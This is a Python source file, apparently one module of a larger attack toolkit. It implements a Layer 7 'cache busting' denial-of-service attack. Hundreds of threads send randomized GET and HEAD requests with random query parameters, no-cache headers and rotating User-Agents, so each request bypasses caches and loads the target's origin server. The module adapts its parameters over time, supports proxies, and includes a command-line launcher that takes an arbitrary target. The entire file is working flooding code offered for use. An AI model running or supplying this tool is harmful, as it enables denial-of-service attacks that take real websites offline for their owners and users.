#!/usr/bin/env python3
"""
Cache Busting Attack Module
Method: Layer 7 Cache Busting with Parameter Pollution
Author: AXMods
"""

import requests
import random
import time
import threading
import concurrent.futures
import urllib.parse
import sys
import os

# Add parent directory to path for imports
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils import get_random_user_agent, print_status, generate_random_string
from config import USER_AGENTS, HEADERS_TEMPLATE, TIMEOUT
from colorama import Fore, init

init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class CacheBuster:
    def __init__(self, target, port=80, threads=500, duration=60, use_https=False, proxy=None):
        """
        Initialize Cache Busting Attack
        
        Args:
            target (str): Target URL or IP
            port (int): Target port
            threads (int): Number of concurrent threads
            duration (int): Attack duration in seconds
            use_https (bool): Use HTTPS instead of HTTP
            proxy (dict): Optional proxy configuration
        """
        # Clean target input
        self.target = target.strip()
        if not self.target.startswith(('http://', 'https://')):
            self.target = f"{'https' if use_https else 'http'}://{self.target}"
        
        # Remove trailing slash for consistency
        self.target = self.target.rstrip('/')
        self.port = port
        self.threads = threads
        self.duration = duration
        self.use_https = use_https
        self.proxy = proxy
        self.is_attacking = False
        
        # Statistics
        self.request_count = 0
        self.cache_hits = 0
        self.cache_misses = 0
        self.error_count = 0
        self.start_time = None
        
        # Cache busting techniques
        self.param_names = [
            'v', 'version', 't', 'time', 'r', 'random', 'cache', 'nocache',
            'cb', 'timestamp', 'uid', 'id', 'session', 'token', 'key'
        ]
        
        self.header_combinations = [
            {'Cache-Control': 'no-cache, no-store, must-revalidate'},
            {'Pragma': 'no-cache'},
            {'Expires': '0'},
            {'Cache-Control': 'max-age=0'},
            {'Cache-Control': 'private, no-cache, no-store, must-revalidate'},
        ]
        
        # Common paths for web applications
        self.paths = [
            '/', '/index.html', '/home', '/main', '/default.aspx', 
            '/index.php', '/wp-content/uploads/', '/static/js/', 
            '/api/v1/users', '/api/v1/products', '/search', '/login',
            '/admin', '/dashboard', '/profile', '/settings'
        ]
        
        # File extensions for different content types
        self.extensions = [
            '', '.html', '.php', '.aspx', '.jsp', '.js', '.css',
            '.png', '.jpg', '.gif', '.json', '.xml', '.txt'
        ]
        
    def _generate_cache_busting_url(self, base_url):
        """Generate URL with cache busting parameters"""
        # Choose random path
        path = random.choice(self.paths)
        
        # Add random extension
        if random.random() > 0.7:  # 30% chance to add extension
            path += random.choice(self.extensions)
        
        # Build URL with parameters
        params = {}
        num_params = random.randint(2, 6)
        
        for _ in range(num_params):
            param_name = random.choice(self.param_names)
            # Different value generation strategies
            if param_name in ['v', 'version']:
                param_value = str(random.randint(1, 9999))
            elif param_name in ['t', 'time', 'timestamp']:
                param_value = str(int(time.time() * 1000) + random.randint(-1000, 1000))
            elif param_name in ['r', 'random', 'uid', 'id']:
                param_value = generate_random_string(random.randint(8, 32))
            else:
                param_value = generate_random_string(random.randint(4, 16))
            
            params[param_name] = param_value
        
        # Add cache busting parameter as well
        params['_'] = str(int(time.time() * 1000))
        
        # URL encode parameters
        query_string = urllib.parse.urlencode(params)
        
        return f"{base_url}{path}?{query_string}"
    
    def _generate_headers(self):
        """Generate headers with cache busting directives"""
        headers = HEADERS_TEMPLATE.copy()
        headers['User-Agent'] = get_random_user_agent()
        
        # Add cache control headers (90% of requests)
        if random.random() > 0.1:
            cache_headers = random.choice(self.header_combinations)
            headers.update(cache_headers)
        
        # Vary headers to prevent caching by user-agent, accept, etc.
        if random.random() > 0.5:
            headers['Vary'] = random.choice(['*', 'User-Agent', 'Accept-Encoding', 'Accept'])
        
        # Add random headers to make each request unique
        if random.random() > 0.3:
            random_header = f"X-{generate_random_string(5)}"
            headers[random_header] = generate_random_string(random.randint(5, 20))
        
        return headers
    
    def _send_request(self):
        """Send a single cache-busted request"""
        try:
            # Generate unique URL and headers
            url = self._generate_cache_busting_url(self.target)
            headers = self._generate_headers()
            
            # Choose HTTP method (mostly GET, some HEAD)
            method = 'GET' if random.random() > 0.1 else 'HEAD'
            
            if method == 'GET':
                response = requests.get(
                    url,
                    headers=headers,
                    timeout=TIMEOUT,
                    verify=False,
                    proxies=self.proxy,
                    allow_redirects=True
                )
            else:  # HEAD
                response = requests.head(
                    url,
                    headers=headers,
                    timeout=TIMEOUT,
                    verify=False,
                    proxies=self.proxy,
                    allow_redirects=True
                )
            
            # Check cache headers in response
            cache_control = response.headers.get('Cache-Control', '').lower()
            pragma = response.headers.get('Pragma', '').lower()
            expires = response.headers.get('Expires', '')
            
            # Determine if response might be cached
            is_cached = (
                'max-age' in cache_control or
                'public' in cache_control or
                's-maxage' in cache_control or
                (expires and '0' not in expires and '-1' not in expires)
            )
            
            # Update statistics
            self.request_count += 1
            if is_cached:
                self.cache_hits += 1
            else:
                self.cache_misses += 1
            
            # Log every 50th request
            if self.request_count % 50 == 0:
                cache_ratio = (self.cache_hits / self.request_count * 100) if self.request_count > 0 else 0
                print_status(
                    f"Requests: {self.request_count:,} | "
                    f"Cache Hits: {self.cache_hits:,} ({cache_ratio:.1f}%) | "
                    f"Method: {method}",
                    Fore.CYAN
                )
            
            return True
            
        except requests.exceptions.Timeout:
            self.error_count += 1
            return False
        except requests.exceptions.ConnectionError:
            self.error_count += 1
            return False
        except Exception as e:
            self.error_count += 1
            return False
    
    def _attack_worker(self):
        """Worker thread for sending cache-busted requests"""
        while self.is_attacking:
            self._send_request()
            
            # Small random delay to vary request rate
            time.sleep(random.uniform(0.01, 0.1))
    
    def _stats_monitor(self):
        """Monitor and display attack statistics"""
        self.start_time = time.time()
        
        while self.is_attacking:
            elapsed = time.time() - self.start_time
            if elapsed > 0:
                rps = self.request_count / elapsed
                cache_ratio = (self.cache_hits / self.request_count * 100) if self.request_count > 0 else 0
                
                stats = (
                    f"Requests: {self.request_count:,} | "
                    f"RPS: {rps:.1f} | "
                    f"Cache Hits: {cache_ratio:.1f}% | "
                    f"Errors: {self.error_count:,} | "
                    f"Elapsed: {elapsed:.1f}s"
                )
                
                print_status(stats, Fore.YELLOW)
            
            time.sleep(2)
    
    def _cache_effectiveness_monitor(self):
        """Monitor cache effectiveness and adjust strategy"""
        sample_interval = 30  # Check every 30 seconds
        
        while self.is_attacking:
            time.sleep(sample_interval)
            
            # Calculate current cache hit ratio
            total = self.cache_hits + self.cache_misses
            if total > 100:  # Only adjust if we have enough data
                cache_ratio = self.cache_hits / total * 100
                
                if cache_ratio > 20:  # Too many cache hits
                    print_status(
                        f"High cache hit ratio ({cache_ratio:.1f}%) - increasing parameter randomness",
                        Fore.RED
                    )
                    # Increase parameter complexity
                    self.param_names.extend([
                        f'cb{random.randint(1, 999)}',
                        f'nc{random.randint(1, 999)}',
                        f'rb{random.randint(1, 999)}'
                    ])
                else:
                    print_status(
                        f"Good cache busting effectiveness ({cache_ratio:.1f}% hits)",
                        Fore.GREEN
                    )
    
    def _parameter_evolution(self):
        """Evolve parameters over time to stay effective"""
        evolution_interval = 45  # Evolve every 45 seconds
        
        while self.is_attacking:
            time.sleep(evolution_interval)
            
            # Add new random parameter names
            new_params = [
                f'x{generate_random_string(3).lower()}',
                f'y{generate_random_string(3).lower()}',
                f'z{generate_random_string(3).lower()}'
            ]
            
            self.param_names.extend(new_params)
            
            print_status(
                f"Parameter evolution: Added {len(new_params)} new parameters. "
                f"Total unique parameters: {len(self.param_names)}",
                Fore.MAGENTA
            )
    
    def start(self, aggressive=False):
        """
        Start Cache Busting attack
        
        Args:
            aggressive (bool): If True, use more aggressive cache busting techniques
        """
        mode = "AGGRESSIVE" if aggressive else "STANDARD"
        print_status(f"Starting CACHE BUSTING attack ({mode})...", Fore.RED)
        print_status(f"Target: {self.target}", Fore.WHITE)
        print_status(f"Threads: {self.threads}", Fore.WHITE)
        print_status(f"Duration: {self.duration} seconds", Fore.WHITE)
        print_status(f"Cache Busting Parameters: {len(self.param_names)}", Fore.WHITE)
        print_status("-" * 50, Fore.WHITE)
        
        if aggressive:
            # Add more aggressive techniques
            self.header_combinations.append({'Cache-Control': 'no-transform'})
            self.header_combinations.append({'Cache-Control': 'no-cache, no-store, proxy-revalidate'})
            
            # Add more paths for aggressive mode
            self.paths.extend([
                '/api/graphql', '/graphql', '/api/rest', '/rest/api',
                '/ajax', '/async', '/websocket', '/sse'
            ])
            
            print_status("Aggressive mode enabled: Enhanced cache busting techniques", Fore.RED)
        
        self.is_attacking = True
        self.request_count = 0
        self.cache_hits = 0
        self.cache_misses = 0
        self.error_count = 0
        
        # Start statistics monitor
        stats_thread = threading.Thread(target=self._stats_monitor, daemon=True)
        stats_thread.start()
        
        # Start cache effectiveness monitor
        cache_monitor_thread = threading.Thread(target=self._cache_effectiveness_monitor, daemon=True)
        cache_monitor_thread.start()
        
        # Start parameter evolution
        evolution_thread = threading.Thread(target=self._parameter_evolution, daemon=True)
        evolution_thread.start()
        
        # Start attack threads
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            
            # Submit worker threads
            for _ in range(self.threads):
                future = executor.submit(self._attack_worker)
                futures.append(future)
            
            # Run for specified duration
            time.sleep(self.duration)
            
            # Stop attack
            self.is_attacking = False
            
            # Wait for threads to complete
            concurrent.futures.wait(futures, timeout=5)
        
        # Final statistics
        elapsed = time.time() - self.start_time
        total_requests = self.request_count
        total_errors = self.error_count
        cache_hit_ratio = (self.cache_hits / total_requests * 100) if total_requests > 0 else 0
        success_rate = ((total_requests - total_errors) / total_requests * 100) if total_requests > 0 else 0
        
        print_status("-" * 50, Fore.WHITE)
        print_status("CACHE BUSTING ATTACK COMPLETED", Fore.RED)
        print_status(f"Total Requests: {total_requests:,}", Fore.GREEN)
        print_status(f"Cache Hits: {self.cache_hits:,} ({cache_hit_ratio:.1f}%)", Fore.YELLOW)
        print_status(f"Cache Misses: {self.cache_misses:,}", Fore.CYAN)
        print_status(f"Success Rate: {success_rate:.1f}%", Fore.MAGENTA)
        print_status(f"Average RPS: {total_requests/elapsed:.1f}", Fore.WHITE)
        print_status(f"Total Duration: {elapsed:.1f} seconds", Fore.WHITE)
        print_status(f"Unique Parameters Used: {len(self.param_names)}", Fore.WHITE)
        
        effectiveness = "HIGH" if cache_hit_ratio < 10 else "MEDIUM" if cache_hit_ratio < 30 else "LOW"
        print_status(f"Cache Busting Effectiveness: {effectiveness}", 
                     Fore.GREEN if effectiveness == "HIGH" else Fore.YELLOW if effectiveness == "MEDIUM" else Fore.RED)
        
        return {
            'total_requests': total_requests,
            'cache_hits': self.cache_hits,
            'cache_misses': self.cache_misses,
            'cache_hit_ratio': cache_hit_ratio,
            'error_count': total_errors,
            'success_rate': success_rate,
            'average_rps': total_requests/elapsed,
            'duration': elapsed,
            'unique_parameters': len(self.param_names),
            'effectiveness': effectiveness
        }

# Standalone test function
if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="Cache Busting Attack Module")
    parser.add_argument("target", help="Target URL or IP")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target port")
    parser.add_argument("-t", "--threads", type=int, default=100, help="Number of threads")
    parser.add_argument("-d", "--duration", type=int, default=30, help="Attack duration in seconds")
    parser.add_argument("-s", "--https", action="store_true", help="Use HTTPS")
    parser.add_argument("-a", "--aggressive", action="store_true", help="Use aggressive cache busting")
    
    args = parser.parse_args()
    
    print(f"[*] Starting Cache Busting test against {args.target}")
    print(f"[*] Threads: {args.threads}")
    print(f"[*] Duration: {args.duration}s")
    print(f"[*] HTTPS: {args.https}")
    print(f"[*] Aggressive: {args.aggressive}")
    print("-" * 50)
    
    attack = CacheBuster(
        target=args.target,
        port=args.port,
        threads=args.threads,
        duration=args.duration,
        use_https=args.https
    )
    
    try:
        results = attack.start(aggressive=args.aggressive)
        print(f"\n[+] Attack completed successfully!")
        print(f"Cache Busting Effectiveness: {results['effectiveness']}")
    except KeyboardInterrupt:
        print(f"\n[!] Attack interrupted by user")
    except Exception as e:
        print(f"\n[!] Error: {e}")
        import traceback
        traceback.print_exc()
